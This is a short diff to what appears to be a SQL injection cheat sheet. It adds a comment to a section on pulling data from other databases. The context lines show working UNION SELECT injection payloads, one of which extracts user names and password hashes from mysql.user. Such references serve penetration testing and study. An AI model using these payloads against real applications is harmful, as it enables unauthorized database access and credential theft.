@@ -129,6 +129,7 @@ Retrieving multiple values within a single column - useful if the application on
 Get Data From Other Databases
 -----------------------------
 ```
+# Need to know the dbname, tablename, and column names.
 'UNION+ALL+SELECT+NULL,NULL,concat(0x28,column1,0x3a,column2,0x29)+FROM+dbname.tablename#
 'UNION+ALL+SELECT+NULL,NULL,concat(0x28,user,0x3a,password,0x29)+FROM+mysql.user#
 
